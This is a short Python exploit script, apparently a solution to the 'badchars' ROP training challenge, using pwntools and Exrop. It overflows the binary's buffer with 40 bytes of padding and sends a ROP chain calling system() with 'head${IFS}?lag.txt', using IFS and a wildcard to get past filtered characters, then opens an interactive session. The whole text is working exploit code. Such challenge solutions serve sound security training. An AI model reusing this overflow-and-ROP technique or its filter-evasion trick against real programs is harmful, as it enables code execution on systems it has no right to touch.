from Exrop import Exrop
from pwn import *

binname = "./badchars"
rop = Exrop(binname)
rop.find_gadgets(cache=True)
elf = ELF("./badchars", checksec=False)
system = elf.symbols['system']
print("system @ {:08x}".format(system))
chain = rop.func_call(system, ("head${IFS}?lag.txt", 0), elf.bss()) # hack to avoid badchar
#chain.dump()
buf  = b"A"*40
payload = buf + chain.payload_str()
p = process("./badchars")
p.recv(1024)
p.sendline(payload)
p.interactive()
